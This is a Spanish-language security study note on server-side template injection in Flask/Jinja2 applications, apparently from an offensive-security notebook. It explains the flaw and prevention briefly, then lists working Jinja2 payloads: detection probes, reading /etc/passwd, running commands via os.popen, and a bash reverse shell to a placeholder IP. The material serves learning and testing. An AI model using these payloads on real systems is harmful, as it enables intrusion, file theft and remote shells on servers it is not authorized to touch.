# Server-Side Template Injection (SSTI)

Tags: #SSTI #OWASP #Explotacion 

* [HackTricks](https://book.hacktricks.xyz/welcome/readme)
* [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

El **Server-Side Template Injection** (**SSTI**) es una vulnerabilidad de seguridad en la que un atacante puede inyectar código malicioso en una **plantilla** de servidor.

Las plantillas de servidor son archivos que contienen código que se utiliza para generar **contenido dinámico** en una aplicación web. Los atacantes pueden aprovechar una vulnerabilidad de SSTI para inyectar código malicioso en una plantilla de servidor, lo que les permite ejecutar comandos en el servidor y obtener acceso no autorizado tanto a la aplicación web como a posibles datos sensibles.

Por ejemplo, imagina que una aplicación web utiliza plantillas de servidor para generar correos electrónicos personalizados. Un atacante podría aprovechar una vulnerabilidad de **SSTI** para inyectar código malicioso en la plantilla de correo electrónico, lo que permitiría al atacante ejecutar comandos en el servidor y obtener acceso no autorizado a los datos sensibles de la aplicación web.

En un caso práctico, los atacantes pueden detectar si una aplicación Flask está en uso, por ejemplo, utilizando herramientas como **WhatWeb**. Si un atacante detecta que una aplicación **Flask** está en uso, puede intentar explotar una vulnerabilidad de **SSTI**, ya que Flask utiliza el motor de plantillas **Jinja2**, que es vulnerable a este tipo de ataque.

Para los atacantes, detectar una aplicación Flask o Python puede ser un primer paso en el proceso de intentar explotar una vulnerabilidad de SSTI. Sin embargo, los atacantes también pueden intentar identificar vulnerabilidades de SSTI en otras aplicaciones web que utilicen diferentes frameworks de plantillas, como Django, Ruby on Rails, entre otros.

Para prevenir los ataques de SSTI, los desarrolladores de aplicaciones web deben validar y filtrar adecuadamente la entrada del usuario y utilizar herramientas y frameworks de plantillas seguros que implementen medidas de seguridad para prevenir la inyección de código malicioso.


## Comandos

* En **PayloadAllTheThings** nos debemos de ir a **Python - Jinja2**  

Inyecciones SSTI
```bash
❯ {{7*7}}    # El Output nos debe devolver un 49
```

```bash
❯ {{'7'*7}}    # El output nos debe de devolver un 7 representado 7 veces
```

Podemos leer archivos.
```bash
❯ {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

Podemos ejecutar comandos.
```bash
❯ {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Podemos hacer una ReverShell.
```bash
❯ {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<IP>/443 0>&1').read() }}

	# El & en la url, lo debemos de cambiar a %26 para que li interprete de la mejor manera

❯ {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >%26 /dev/tcp/<IP>/443 0>%261').read() }}
```